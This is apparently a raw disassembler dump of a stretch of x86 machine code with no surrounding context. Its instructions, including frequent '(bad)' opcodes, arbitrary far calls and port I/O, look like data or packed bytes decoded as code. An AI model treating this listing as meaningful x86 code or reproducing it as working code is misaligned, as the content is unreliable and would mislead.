  414a7c:	add    eax,0xa586d547
  414a81:	cmp    al,BYTE PTR [eax-0x6a710faa]
  414a87:	mov    ch,BYTE PTR [edi-0x1e]
  414a8a:	ja     0x414a9a
  414a8c:	xor    al,0x45
  414a8e:	mov    al,BYTE PTR ds:0xe5beb8cd
  414a94:	nop
  414a95:	call   0x61c2:0x7d9e34d5
  414a9c:	mov    es,WORD PTR [ebp-0x44]
  414a9f:	popa   
  414aa0:	add    eax,0x587464d8
  414aa5:	loopne 0x414a3d
  414aa7:	lods   al,BYTE PTR ds:[esi]
  414aa8:	call   0x5b3220c7
  414aad:	jo     0x414ae6
  414aaf:	or     dh,BYTE PTR [eax-0x5c6f671d]
  414ab5:	cmp    al,0xae
  414ab7:	dec    ebx
  414ab8:	pop    eax
  414ab9:	mov    edi,0x14170254
  414abe:	les    eax,FWORD PTR [edi]
  414ac0:	push   edx
  414ac1:	xchg   DWORD PTR [ebx+0x69],eax
  414ac4:	inc    ebx
  414ac5:	add    esi,DWORD PTR [ebx-0x7d02cd4d]
  414acb:	mov    dl,0xb9
  414acd:	or     eax,0x62df8d88
  414ad2:	jmp    0x99fa:0xb4c3b42e
  414ad9:	and    cl,BYTE PTR [eax-0x1d2dbeb2]
  414adf:	fld    QWORD PTR [esi]
  414ae1:	add    ebx,DWORD PTR ds:[ebx]
  414ae4:	mov    esp,0xd93aa334
  414ae9:	call   0xfd83452e
  414aee:	jp     0x414a90
  414af0:	mov    al,0xce
  414af2:	and    al,0x94
  414af4:	push   ebx
  414af5:	lds    edx,FWORD PTR [ebx-0x49ae090c]
  414afb:	jl     0x414a87
  414afd:	retf   0x6a36
  414b00:	jbe    0x414b43
  414b02:	popa   
  414b03:	push   ecx
  414b04:	dec    esp
  414b05:	in     al,dx
  414b06:	jb     0x414b22
  414b08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b09:	outs   dx,BYTE PTR ds:[esi]
  414b0a:	retf   0xcf85
  414b0d:	push   edx
  414b0e:	aad    0x7b
  414b10:	or     DWORD PTR [eax-0x16],esp
  414b13:	inc    esp
  414b14:	and    BYTE PTR [ebx],0x84
  414b17:	cwde   
  414b18:	shl    BYTE PTR [ecx+0x6b3a20aa],0xa
  414b1f:	sub    ebx,esp
  414b21:	cmp    al,0x52
  414b23:	arpl   WORD PTR [ebp+0x16],dx
  414b26:	mov    al,BYTE PTR [edx]
  414b28:	adc    eax,DWORD PTR [ebp+0x528a10ef]
  414b2e:	call   0xc45b2de3
  414b33:	ret    
  414b34:	aaa    
  414b35:	push   ds
  414b36:	loop   0x414b0e
  414b38:	cwde   
  414b39:	sub    DWORD PTR [eax],0x2
  414b3c:	shr    BYTE PTR [esi],1
  414b3e:	loopne 0x414b1e
  414b40:	add    BYTE PTR [ebp+0x5c],0x66
  414b44:	push   es
  414b45:	adc    al,0x5a
  414b47:	sub    ecx,DWORD PTR [edx+0x340e4678]
  414b4d:	sbb    ah,bh
  414b4f:	jns    0x414b7c
  414b51:	jmp    0xbe56:0xe0011484
  414b58:	gs inc esi
  414b5a:	add    BYTE PTR [ebx-0x5d4f926d],bh
  414b60:	popf   
  414b61:	pop    esi
  414b62:	(bad)  
  414b66:	into   
  414b67:	dec    esp
  414b68:	dec    esp
  414b69:	jge    0x414b14
  414b6b:	dec    ecx
  414b6c:	inc    esp
  414b6d:	mov    BYTE PTR [esi],ch
  414b6f:	or     DWORD PTR [eax],ecx
  414b71:	mov    esp,0x4a6c60f8
  414b76:	sbb    ah,BYTE PTR [eax-0x2f566a9]
  414b7c:	(bad)  
  414b7d:	lods   eax,DWORD PTR ds:[esi]
  414b7e:	(bad)  [esi]
  414b80:	sub    eax,DWORD PTR [edx-0x65]
  414b83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b84:	pusha  
  414b85:	push   cs
  414b86:	(bad)  
  414b87:	dec    esp
  414b88:	cmp    bh,cl
  414b8a:	call   0x500d:0xb5acb016
  414b91:	pushf  
  414b92:	sub    BYTE PTR [esi],0xb5
  414b95:	call   0xa4d0:0xd6b658c2
  414b9c:	push   0xcdb6614c
  414ba1:	dec    esp
  414ba2:	(bad)  
  414ba3:	loop   0x414bcb
  414ba5:	fadd   DWORD PTR [eax+0x76d06ae8]
  414bab:	loopne 0x414b50
  414bad:	push   edi
  414bae:	je     0x414bf6
  414bb0:	cmc    
  414bb1:	sub    BYTE PTR [edx+0x13],ah
  414bb4:	sbb    al,0x34
  414bb6:	mov    bh,0xa3
  414bb8:	int3   
  414bb9:	push   ecx
  414bba:	sub    al,ah
  414bbc:	cwde   
  414bbd:	fsub   st,st(6)
  414bbf:	ror    BYTE PTR [esi+0x419e6536],cl
  414bc5:	mov    ah,0x4d
  414bc7:	cmp    al,0xa
  414bc9:	cmp    al,0x4e
  414bcb:	fsubr  QWORD PTR [esi+0x35b6d55a]
  414bd1:	mov    ch,0xd6
  414bd3:	push   ss
  414bd4:	push   0x204cd9f4
  414bd9:	lods   al,BYTE PTR ds:[esi]
  414bda:	int3   
  414bdb:	jbe    0x414ba5
  414bdd:	and    al,0x4c
  414bdf:	jecxz  0x414bce
  414be1:	add    DWORD PTR [eax-0xb160981],eax
  414be7:	push   edx
  414be8:	or     eax,0x60ec9600
  414bed:	push   ss
  414bee:	or     BYTE PTR [esi+0x38],bl
  414bf1:	mov    cs,WORD PTR [edx]
  414bf3:	pusha  
  414bf4:	mov    DWORD PTR ss:[edx],ecx
  414bf7:	add    esp,DWORD PTR [eax+0x12]
  414bfa:	push   eax
  414bfb:	add    ah,bh
  414bfd:	xor    BYTE PTR [ebx+eiz*4+0x6b4040e1],ch
  414c04:	dec    edx
  414c05:	cmp    BYTE PTR [edx+ebx*2],dl
  414c08:	popa   
  414c09:	and    eax,0xdcda50ac
  414c0e:	xchg   ebp,eax
  414c0f:	repnz fdivr QWORD PTR [ecx+0x43]
  414c13:	ror    DWORD PTR [esi-0x44],0x11
  414c17:	pop    eax
  414c18:	(bad)  
  414c19:	call   0x9b4c:0xb000c5e0
  414c20:	pop    eax
  414c21:	inc    esp
  414c22:	test   DWORD PTR [esi],ebp
  414c24:	sbb    eax,0x41ca52d8
  414c29:	test   eax,0x8007ec1
  414c2e:	and    al,0x43
  414c30:	pop    esi
  414c31:	xchg   BYTE PTR [edi],bl
  414c33:	push   0x40a1b60d
  414c38:	dec    edx
  414c39:	in     al,dx
  414c3a:	std    
  414c3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c3c:	mov    BYTE PTR [esi-0x5c],ch
  414c3f:	sub    BYTE PTR [ecx+0x64],dl
  414c42:	mov    eax,ds:0xdc22a809
  414c47:	sbb    BYTE PTR [edx],dl
  414c49:	imul   ebp,DWORD PTR [eax+0x70609852],0xffffffea
  414c50:	pop    es
  414c51:	mov    esp,0x7686a03d
  414c56:	add    al,0x62
  414c58:	xchg   esp,eax
  414c59:	shl    BYTE PTR fs:[esi+0x58],cl
  414c5d:	mov    ebx,DWORD PTR [edx]
  414c5f:	dec    edi
  414c60:	push   es
  414c61:	or     cl,BYTE PTR [eax-0x3b758705]
  414c67:	jmp    0xcab5:0x8885eba2
  414c6e:	pop    esi
  414c6f:	iret   
  414c70:	aam    0xad
  414c72:	push   ecx
  414c73:	add    eax,0x28169a0b
  414c78:	test   al,0xfc
  414c7a:	out    0x26,al
  414c7c:	pop    edx
  414c7d:	and    al,BYTE PTR [ebx]
  414c7f:	mov    dl,0x5d
  414c81:	not    BYTE PTR [edx]
  414c83:	sbb    ebx,DWORD PTR [ecx+0x765a983a]
  414c89:	(bad)  
  414c8a:	push   esi
  414c8b:	imul   eax,DWORD PTR ds:0xd4a25ea1,0x4c
  414c92:	sbb    BYTE PTR [ebp+edx*1+0x4d],0x66
  414c97:	leave  
  414c98:	mov    al,ds:0x9a7a5e92
  414c9d:	jo     0x414cf9
  414c9f:	xor    DWORD PTR [ebp+0x65601a45],0x2e
  414ca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ca7:	or     bl,BYTE PTR [eax+0x5154ac1f]
  414cad:	push   eax
  414cae:	mov    al,ds:0x22780c00
  414cb3:	mov    edx,0xee6dab62
  414cb8:	pop    eax
  414cb9:	and    bl,BYTE PTR [eax+0x59]
  414cbc:	int3   
  414cbd:	push   esi
  414cbe:	add    BYTE PTR [ebp+esi*4-0x4c],ch
  414cc2:	xchg   esp,eax
  414cc3:	and    eax,0x2385a70e
  414cc8:	test   BYTE PTR [eax+ebp*4+0x4d859a8],0x9
  414cd0:	pop    esp
  414cd1:	pop    edi
  414cd2:	xchg   ebx,eax
  414cd3:	sub    al,0xe2
  414cd5:	adc    ebp,esi
  414cd7:	xchg   esi,eax
  414cd8:	enter  0xa0ed,0x21
  414cdc:	mov    ds,WORD PTR [edx]
  414cde:	sub    ch,dh
  414ce0:	jp     0x414ca8
  414ce2:	retf   
  414ce3:	ds es push eax
  414ce6:	add    BYTE PTR [ebp+0x5e],cl
  414ce9:	jbe    0x414cd1
  414ceb:	xchg   esp,eax
  414cec:	xor    eax,0x40d15427
  414cf1:	pusha  
  414cf2:	out    dx,al
  414cf3:	xchg   edi,eax
  414cf4:	loopne 0x414c8a
  414cf6:	dec    esp
  414cf7:	scas   al,BYTE PTR es:[edi]
  414cf8:	mov    al,ds:0x69a6ad05
  414cfd:	inc    esi
  414cfe:	xor    al,0x30
  414d00:	(bad)
  414d03:	jae    0x414d71
  414d05:	cmp    bl,BYTE PTR [esp+edx*1]
  414d08:	push   es
  414d09:	ins    BYTE PTR es:[edi],dx
  414d0a:	cs dec edi
  414d0c:	addr16 data16 add dh,cl
  414d10:	sub    eax,0x6abc674c
  414d15:	test   al,0xea
  414d17:	pop    ecx
  414d18:	rol    BYTE PTR [esi],0x5d
  414d1b:	les    edi,FWORD PTR [edx+edx*8]
  414d1e:	mov    ds:0x6112248,eax
  414d23:	push   es
  414d24:	xchg   edx,eax
  414d25:	or     al,al
  414d27:	daa    
  414d28:	xor    al,0xe0
  414d2a:	fs mov dh,0xb3
  414d2d:	rcl    DWORD PTR [ecx],0x2b
  414d30:	dec    esp
  414d31:	xchg   ebx,eax
  414d32:	mov    al,BYTE PTR [edx+edi*2]
  414d35:	sbb    al,0x61
  414d37:	xchg   ebp,eax
  414d38:	xchg   edi,eax
  414d39:	test   DWORD PTR [esi+0x50ea164f],ebp
  414d3f:	pop    ss
  414d40:	inc    esi
  414d41:	or     BYTE PTR [ebx+edx*8],dh
  414d44:	or     cl,BYTE PTR [esp+esi*8+0x7d]
  414d48:	dec    esp
  414d49:	inc    eax
  414d4a:	daa    
  414d4b:	bound  eax,QWORD PTR [ebx+0x72bcd6b5]
  414d51:	retf   0x3a74
  414d54:	or     eax,0xd2def894
  414d59:	or     ah,BYTE PTR [ecx+edx*8]
  414d5c:	imul   edx,esi,0xffffffa1
  414d5f:	inc    edx
  414d60:	mov    esp,0x179a7ca2
  414d65:	mov    al,ds:0xc7e4acc3
  414d6a:	fadd   QWORD PTR [edi]
  414d6c:	repz add BYTE PTR [ebp-0x6a],dl
  414d70:	int    0xdf
  414d72:	pusha  
  414d73:	fsubr  DWORD PTR [edx+0x6c]
  414d76:	pop    ebx
  414d77:	ficom  DWORD PTR [esi-0x2]
  414d7a:	lock add BYTE PTR ds:0x59b00064,ch
  414d81:	xchg   ebp,eax
  414d82:	test   BYTE PTR ds:0x92628815,cl
  414d88:	xlat   BYTE PTR ds:[ebx]
  414d89:	inc    ebp
  414d8a:	or     al,BYTE PTR [ebx]
  414d8c:	test   al,0xd2
  414d8e:	ret    0x3a30
  414d91:	daa    
  414d92:	and    cl,BYTE PTR ds:0x7fc058ed
  414d98:	jp     0x414d68
  414d9a:	mov    ebx,0xb7862d40
  414d9f:	pop    edx
  414da0:	push   0xc83f8c3d
  414da5:	in     al,dx
  414da6:	pop    ebx
  414da7:	add    DWORD PTR ds:0x2e9f0a66,edx
  414dad:	adc    DWORD PTR [edx+edi*8],ebp
  414db0:	pop    DWORD PTR [esp+ebp*2-0x4e]
  414db4:	add    eax,0xfa26765a
  414db9:	mov    cl,dh
  414dbb:	jo     0x414d5e
  414dbd:	(bad)  
  414dbe:	xlat   BYTE PTR ds:[ebx]
  414dbf:	aas    
  414dc0:	pop    edx
  414dc1:	repnz sbb eax,DWORD PTR [eax]
  414dc4:	fs bnd ret 
  414dc7:	xchg   edx,eax
  414dc8:	call   0xaa82:0xd09409c3
  414dcf:	or     al,0xc
  414dd1:	pop    ebp
  414dd2:	push   eax
  414dd3:	xchg   ebp,eax
  414dd4:	fiadd  DWORD PTR [eax]
  414dd6:	or     eax,0x23628be4
  414ddb:	imul   edx,DWORD PTR [ecx+0x1],0x869e139a
  414de2:	out    dx,al
  414de3:	inc    esp
  414de4:	lock add DWORD PTR [edx-0x3b],0x23
  414de9:	(bad)  [esi-0x38]
  414dec:	pusha  
  414ded:	pop    es
  414dee:	adc    eax,0x561d012a
  414df3:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  414df5:	hlt    
  414df6:	scas   al,BYTE PTR es:[edi]
  414df7:	ret    0x51bc
  414dfa:	test   DWORD PTR [ebx+0x24b41668],ebx
  414e00:	(bad)  
  414e01:	mov    bl,0xe6
  414e03:	add    bl,al
  414e05:	or     esp,DWORD PTR [ebx-0x2]
  414e08:	sub    BYTE PTR [edx-0x66],dh
  414e0b:	push   cs
  414e0c:	cmp    ch,al
  414e0e:	sbb    eax,0xdbaeb5ad
  414e13:	cmp    BYTE PTR [esi],ch
  414e15:	fs xchg dh,ch
  414e18:	mov    edx,0x7a8a595e
  414e1d:	add    bl,BYTE PTR [ebp+0x45]
  414e20:	idiv   ch
  414e22:	add    BYTE PTR [ecx-0x3e52348],bh
  414e28:	enter  0x910,0x1d
  414e2c:	add    eax,0x7e6c5626
  414e31:	fmul   DWORD PTR [esi+0x302b4761]
  414e37:	push   esi
  414e38:	sub    cl,BYTE PTR [ebp+0xc006558]
  414e3e:	imul   esi,DWORD PTR ds:0xea2849c,0x824076f9
  414e48:	add    BYTE PTR [edx-0x6445fd5e],0xe
  414e4f:	sub    esp,esp
  414e51:	(bad)  
  414e52:	push   ds
  414e53:	push   esi
  414e54:	mov    WORD PTR [edx+0x54b847a6],fs
  414e5a:	xchg   edx,eax
  414e5b:	sahf   
  414e5c:	call   0x42893677
  414e61:	inc    ebp
  414e62:	repz lock add dl,cl
  414e66:	shr    ecx,1
  414e68:	sub    bl,cl
  414e6a:	test   al,0x92
  414e6c:	and    eax,0xe841ed0
  414e71:	imul   BYTE PTR [ecx-0x54]
  414e74:	xchg   ebp,eax
  414e75:	shl    BYTE PTR [eax+0x206c135],1
  414e7b:	test   al,0xaa
  414e7d:	nop
  414e7e:	xor    al,0xee
  414e80:	loop   0x414eff
  414e82:	sub    DWORD PTR cs:[edx-0x33cd4596],0x2952e5d
  414e8d:	fld    TBYTE PTR [edx]
  414e8f:	mov    al,BYTE PTR [edx]
  414e91:	jo     0x414edf
  414e93:	or     eax,DWORD PTR [eax-0x6a]
  414e96:	adc    al,0x10
  414e98:	rcl    BYTE PTR [eax],0xb1
  414e9b:	jne    0x414e75
  414e9d:	mov    cl,0x2c
  414e9f:	cs pushf 
  414ea1:	xchg   DWORD PTR [edx+0x6a59dde3],ebx
  414ea7:	xchg   edx,eax
  414ea8:	cmp    eax,0x4e23f06
  414ead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414eae:	jne    0x414e60
  414eb0:	or     ch,BYTE PTR [ecx-0x5a87f1e]
  414eb6:	mov    eax,ds:0x53ac3f22
  414ebb:	adc    eax,0xdc4e1955
  414ec0:	and    bh,dl
  414ec2:	mov    dl,BYTE PTR [eax]
  414ec4:	or     cl,BYTE PTR cs:[edi]
  414ec7:	arpl   WORD PTR [edi+0x17],ax
  414eca:	and    BYTE PTR [eax],cl
  414ecc:	test   BYTE PTR [esi],al
  414ece:	lds    eax,FWORD PTR [esi-0x1cd4f4d]
  414ed4:	hlt    
  414ed5:	sahf   
  414ed6:	outs   dx,DWORD PTR ds:[esi]
  414ed7:	jne    0x414f0d
  414ed9:	adc    al,0x18
  414edb:	nop
  414edc:	fdiv   st,st(7)
  414ede:	mov    esp,0x8103de9a
  414ee3:	mov    ch,0x35
  414ee5:	push   esp
  414ee6:	fdiv   QWORD PTR ss:[ecx+ebx*4+0x7c]
  414eeb:	test   BYTE PTR [esi+ebp*8+0x5a],ch
  414eef:	or     eax,0xe2b7da24
  414ef4:	xchg   edi,eax
  414ef5:	inc    esi
  414ef6:	in     al,0x4a
  414ef8:	or     DWORD PTR [esi+0x3d],esp
  414efb:	push   0xffffffdc
  414efd:	xchg   edx,eax
  414efe:	nop
  414eff:	push   eax
  414f00:	mov    dh,BYTE PTR [eax+0x26b61dae]
  414f06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f07:	pop    esp
  414f08:	ins    BYTE PTR es:[edi],dx
  414f09:	in     al,dx
  414f0a:	push   0x69ec62f
  414f0f:	add    BYTE PTR [edi-0x168dd9a2],ah
  414f15:	jae    0x414f2c
  414f17:	mov    DWORD PTR [ebp-0x6b87318a],ecx
  414f1d:	out    0x5c,eax
  414f1f:	add    ah,dl
  414f21:	dec    ebp
  414f22:	and    al,0x15
  414f24:	mov    al,ds:0xe8a0f964
  414f29:	push   esi
  414f2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f2b:	sub    dh,BYTE PTR fs:[eax+0x1a]
  414f2f:	mov    al,0xbf
  414f31:	push   ss
  414f32:	retf   0xda78
  414f35:	inc    ebp
  414f36:	dec    ebp
  414f37:	xchg   ecx,eax
  414f38:	inc    ebx
  414f39:	shl    dl,cl
  414f3b:	ret    
  414f3c:	push   0xffffffec
  414f3e:	les    ebx,FWORD PTR [eax]
  414f40:	mov    ecx,DWORD PTR [esi-0x36b93a5f]
  414f46:	jp     0x414f51
  414f48:	xor    eax,0x5c143606
  414f4d:	fdivr  DWORD PTR ds:0x15d48d36
  414f53:	and    eax,0x8745a8bf
  414f58:	inc    eax
  414f59:	mov    esi,0x942efab0
  414f5e:	pop    ecx
  414f5f:	loope  0x414f1b
  414f61:	ss sbb al,0x2
  414f64:	adc    cl,ch
  414f66:	or     BYTE PTR [ebp-0x6eb8c733],bl
  414f6c:	adc    DWORD PTR [edi],0x5a2e8410
  414f72:	xchg   edx,eax
  414f73:	cmp    ecx,DWORD PTR [edx-0x6f553bfc]
  414f79:	fidivr DWORD PTR [ebp-0x64]
  414f7c:	xor    eax,0xcaab4eed
  414f81:	jbe    0x414f3c
  414f83:	pop    ss
  414f84:	test   eax,0x32db901c
  414f89:	inc    edx
  414f8a:	rcl    DWORD PTR [ecx-0x7a33427c],0x2a
  414f91:	xchg   esp,eax
  414f92:	inc    edx
  414f93:	rcr    BYTE PTR [ebx+0x9dc9ad9],0xeb
  414f9a:	add    BYTE PTR [ecx-0x7d7c7aaf],ch
  414fa0:	xchg   ax,ax
  414fa2:	adc    BYTE PTR [ebp+0x6e],ah
  414fa5:	stos   DWORD PTR es:[edi],eax
  414fa6:	ret    
  414fa7:	jle    0x415012
  414fa9:	jmp    0x3634:0x10352ce8
  414fb0:	jle    0x414fb3
  414fb2:	mov    ds:0x4d4ad6d,al
  414fb7:	inc    esi
  414fb8:	aam    0x4
  414fba:	test   BYTE PTR [ebp+0x7c],bh
  414fbd:	cmp    al,0xb6
  414fbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fc0:	mov    dh,0xf0
  414fc2:	les    ecx,FWORD PTR [esp+ebp*2]
  414fc5:	dec    esp
  414fc6:	add    esi,DWORD PTR [esi+0x78]
  414fc9:	adc    DWORD PTR ds:0x7c06878e,0xffffffa9
  414fd0:	sbb    al,0x9c
  414fd2:	xor    al,0x7c
  414fd4:	xor    DWORD PTR [ebp+0x38600545],0xe84cf756
  414fde:	or     cl,BYTE PTR [eax+0x5b00d0e4]
  414fe4:	push   ecx
  414fe5:	sbb    eax,0x49c41514
  414fea:	jne    0x415057
  414fec:	das    
  414fed:	or     DWORD PTR [edx+0x5b],eax
  414ff0:	rol    dl,1
  414ff2:	jno    0x415054
  414ff4:	inc    ebx
  414ff5:	fnstcw WORD PTR [esi-0x52e678fe]
  414ffb:	jecxz  0x414fe7
  414ffd:	pushf  
  414ffe:	push   es
  414fff:	sbb    bh,BYTE PTR [esi-0x53abe72f]
  415005:	add    BYTE PTR [edi+eax*2+0x67],0x60
  41500a:	je     0x415026
  41500c:	or     al,dl
  41500e:	pop    ecx
  41500f:	(bad)  
  415010:	dec    esi
  415011:	leave  
  415012:	mov    dl,0x1e
  415014:	test   al,0xa8
  415016:	fisubr WORD PTR [ecx-0x5f93ab84]
  41501c:	mov    al,ds:0x3718b064
  415021:	and    al,0x47
  415023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415024:	pop    es
  415025:	loope  0x414fdc
  415027:	mov    eax,0x4cbae6c6
  41502c:	or     al,al
  41502e:	or     al,bh
  415030:	mov    ds,ebx
  415032:	cld    
  415033:	and    edi,DWORD PTR [edx+0x18778e66]
  415039:	mov    cl,0x4
  41503b:	rol    DWORD PTR [ecx],0xf2
  41503e:	mov    al,ds:0x343a0410
  415043:	sar    BYTE PTR [edi-0x1e],0xde
  415047:	mov    dl,0x5a
  415049:	ins    DWORD PTR es:[edi],dx
  41504a:	imul   edx,edi,0x4a
  41504d:	jecxz  0x41502b
  41504f:	xchg   esi,eax
  415050:	xor    al,0x89
  415052:	icebp  
  415053:	mov    dl,0x33
  415055:	adc    eax,0x763fd297
  41505a:	pusha  
  41505b:	rol    BYTE PTR [eax],1
  41505d:	cmp    DWORD PTR [esi+ecx*8],eax
  415060:	and    al,0x1c
  415062:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415063:	sub    al,0x6a
  415065:	add    eax,0x48cce60d
  41506a:	or     al,0x52
  41506c:	(bad)  
  41506d:	clc    
  41506e:	es push ebx
  415070:	shl    BYTE PTR [esi+0x2f],1
  415073:	dec    ecx
  415074:	push   ss
  415075:	es ss das 
  415078:	scas   al,BYTE PTR es:[edi]
  415079:	xchg   ebx,eax
  41507a:	dec    esp
  41507b:	in     al,dx
  41507c:	sub    eax,0x822638a8
  415081:	inc    esi
  415082:	lods   al,BYTE PTR ds:[esi]
  415083:	sti    
  415084:	rol    BYTE PTR [ebx+eiz*2],0x3d
  415088:	pop    eax
  415089:	clc    
  41508a:	or     dh,dl
  41508c:	pop    eax
  41508d:	push   cs
  41508e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41508f:	and    ecx,DWORD PTR [ebx-0x3c]
  415092:	xchg   ecx,eax
  415093:	push   esi
  415094:	mov    ah,0x3d
  415096:	push   0xffffff8c
  415098:	repnz push 0x20816883
  41509e:	mov    dh,0x61
  4150a1:	add    ah,dh
  4150a3:	adc    ah,BYTE PTR [eax-0x7883ffe1]
  4150a9:	sbb    dh,al
  4150ab:	adc    ebx,DWORD PTR [edi]
  4150ad:	add    BYTE PTR [edx],ch
  4150af:	mov    bl,0xc8
  4150b1:	sbb    eax,0x6ab71aa
  4150b6:	pusha  
  4150b7:	adc    dh,ch
  4150b9:	add    eax,DWORD PTR [edx+0x5436003a]
  4150bf:	ret    
  4150c0:	or     dh,BYTE PTR ds:0x4974a0e8
  4150c6:	mov    dh,0x86
  4150c8:	mov    edi,0x64cf6c00
  4150cd:	ret    
  4150ce:	xchg   esp,eax
  4150cf:	sub    eax,0x4134140c
  4150d4:	mov    ds:0xbe407ec9,al
  4150d9:	daa    
  4150da:	dec    esp
  4150db:	jo     0x4150ff
  4150dd:	jecxz  0x4150ac
  4150df:	mov    al,0xa3
  4150e1:	mov    al,ds:0x9906933a
  4150e6:	inc    edx
  4150e7:	sbb    bl,BYTE PTR [edi-0x5f58d780]
  4150ed:	add    ebp,DWORD PTR [edi-0x4c]
  4150f0:	and    BYTE PTR [ebx+esi*1-0xc],ah
  4150f4:	sub    BYTE PTR [edx-0x4c],ch
  4150f7:	mov    al,ds:0xf484aaa8
  4150fc:	push   es
  4150fd:	mov    esp,0xbac01fbc
  415102:	stos   DWORD PTR es:[edi],eax
  415103:	push   esi
  415104:	mov    edi,DWORD PTR fs:[esi-0x6b0d4726]
  41510b:	call   esi
  41510d:	cwde   
  41510e:	pop    esp
  41510f:	add    BYTE PTR [ecx+0x6f],0xa
  415113:	mov    dh,0x55
  415115:	dec    esp
  415116:	jmp    0xc9e111fb
  41511b:	add    bl,ch
  41511d:	push   cs
  41511e:	mov    ds:0xa81ec2aa,al
  415123:	aam    0xa4
  415125:	push   0xffffffdc
  415127:	rcr    DWORD PTR [edx-0x58],0xb0
  41512b:	push   ebp
  41512c:	mov    ds:0x1d83c4b6,al
  415131:	out    dx,al
  415132:	test   DWORD PTR [edx+0x66],esp
  415135:	cmp    eax,0x2b059a3d
  41513a:	int3   
  41513b:	push   0x50
  41513d:	ror    BYTE PTR [edx+0x3a],1
  415140:	jbe    0x415151
  415142:	adc    cl,BYTE PTR [eax-0x19ff5553]
  415148:	add    BYTE PTR [edx+eax*2-0xc],bl
  41514c:	fstp   DWORD PTR [edx-0x69]
  41514f:	sbb    al,0x7d
  415151:	or     eax,0xca15b005
  415156:	iret   
  415157:	ret    0x882e
  41515a:	mov    dh,0x32
  41515c:	mov    cl,0x3
  41515e:	loopne 0x415167
  415160:	mov    BYTE PTR [ecx+0x70],ch
  415163:	mov    ebx,DWORD PTR [edx+eax*1-0x54]
  415167:	push   0xffffffb6
  415169:	fldcw  WORD PTR [ecx+0x53]
  41516c:	add    al,0x2e
  41516e:	aam    0xf9
  415170:	sbb    BYTE PTR [eax+0xb],0x0
  415174:	and    edx,edi
  415176:	and    eax,0xe22574db
  41517b:	into   
  41517c:	sbb    al,0x87
  41517e:	and    eax,0xb2eda2d6
  415183:	sbb    eax,0x3ae9535b
  415188:	aam    0x91
  41518a:	push   ss
  41518b:	mov    es,WORD PTR [ebx+0x4d71d055]
  415191:	jmp    0x1211:0x7243ae80
  415198:	ret    0xd68a
  41519b:	cwde   
  41519c:	adc    al,0x70
  41519e:	in     eax,dx
  41519f:	mov    es,WORD PTR [ecx]
  4151a1:	call   0xa1fc:0x3c56a0f1
  4151a8:	push   ss
  4151a9:	enter  0x68bd,0x10
  4151ad:	mov    ebx,0xa90a8a1a
  4151b2:	push   esi
  4151b3:	sbb    esp,DWORD PTR [edx-0x62]
  4151b6:	retf   
  4151b7:	fiadd  DWORD PTR [ebx]
  4151b9:	sar    DWORD PTR [esi-0x40],1
  4151bc:	test   DWORD PTR [ebx-0x18],esi
  4151bf:	repnz stos BYTE PTR es:[edi],al
  4151c1:	gs adc bl,al
  4151c4:	es popa 
  4151c6:	adc    bl,BYTE PTR [edx]
  4151c8:	push   eax
  4151c9:	dec    ecx
  4151ca:	jp     0x415150
  4151cc:	add    eax,0x1ec0a85f
  4151d1:	(bad)  
  4151d2:	test   al,0x48
  4151d4:	jmp    0xe086430e
  4151d9:	test   DWORD PTR [edx-0x3b],edi
  4151dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151dd:	clc    
  4151de:	int3   
  4151df:	pop    eax
  4151e0:	in     eax,0x58
  4151e2:	push   eax
  4151e3:	adc    dh,bh
  4151e5:	(bad)  
  4151e6:	dec    edx
  4151e7:	sub    eax,0x5a980cba
  4151ec:	(bad)  
  4151ed:	mov    al,0xe1
  4151ef:	sbb    BYTE PTR [esi+0x68],dl
  4151f2:	push   cs
  4151f3:	pop    esp
  4151f4:	das    
  4151f5:	inc    esp
  4151f6:	mov    es,WORD PTR [edx+eiz*4]
  4151f9:	add    dh,BYTE PTR [eax+0xb]
  4151fc:	mov    dl,0x18
  4151fe:	jl     0x4151ad
  415200:	mov    edx,0xa6a25c4b
  415206:	retf   0xe1e0
  415209:	sub    BYTE PTR [edx],0xdb
  41520c:	mov    cs,WORD PTR [eax+0x66d31c90]
  415212:	les    eax,FWORD PTR [edx+0x6b]
  415215:	adc    ch,BYTE PTR [edx]
  415217:	rol    DWORD PTR [edx],0xd1
  41521a:	out    0x3b,al
  41521c:	mov    dh,0x8a
  41521e:	dec    ebx
  41521f:	mov    ds:0xa2804e54,al
  415224:	mov    cs,WORD PTR [edx+0x18deca89]
  41522a:	mov    edx,es
  41522c:	bound  ecx,QWORD PTR [eax]
  41522e:	add    al,0x2
  415230:	cwde   
  415231:	scas   al,BYTE PTR es:[edi]
  415232:	jl     0x41529c
  415234:	add    BYTE PTR [edi],dh
  415236:	test   ebp,ecx
  415238:	push   ss
  415239:	cld    
  41523a:	add    eax,0x9946a681
  41523f:	pop    esp
  415240:	push   es
  415241:	and    al,0xb4
  415243:	sub    esp,eax
  415245:	sbb    BYTE PTR [ebx],ch
  415247:	ret    0x4a9
  41524a:	fbld   TBYTE PTR [esi+0x7e1809aa]
  415250:	xchg   BYTE PTR [ecx-0x45d71498],dl
  415256:	pusha  
  415257:	push   esp
  415258:	(bad)  
  415259:	pop    ecx
  41525a:	push   es
  41525b:	into   
  41525c:	pop    esi
  41525d:	sub    dh,BYTE PTR [ebp+0x5e0647b3]
  415263:	fs dec esi
  415265:	and    eax,0xf44e592c
  41526a:	or     ah,BYTE PTR [ecx-0x7d]
  41526d:	sbb    BYTE PTR [edx-0x30],al
  415270:	pop    esp
  415271:	push   cs
  415272:	mov    ?,WORD PTR [eax]
  415274:	dec    esp
  415275:	lods   al,BYTE PTR ds:[esi]
  415276:	sub    al,BYTE PTR [eax-0x2d42fb02]
  41527c:	fst    QWORD PTR [eax]
  41527e:	mov    dh,0xb
  415280:	or     BYTE PTR [edi-0x752ea2ca],cl
  415286:	mov    eax,ds:0x8cc12904
  41528b:	inc    eax
  41528c:	sti    
